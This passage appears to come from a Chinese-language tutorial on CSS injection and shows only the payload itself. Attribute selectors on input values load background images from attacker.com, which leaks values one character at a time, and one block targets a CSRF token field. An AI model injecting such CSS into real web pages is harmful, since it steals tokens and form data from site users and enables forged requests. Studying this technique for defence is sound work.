...
input[value^='a'] {
  background: url(https://attacker.com/char?a);
}
input[value^='b'] {
  background: url(https://attacker.com/char?b);
}
input[value^='c'] {
  background: url(https://attacker.com/char?c);
}
/* ... 26个字母 + 数字 + 特殊字符 ... */

/* 针对 CSRF token 的 CSS 注入 */
input[name='csrf_token'][value^='a'] {
  background: url(https://attacker.com/token/a);
}
```
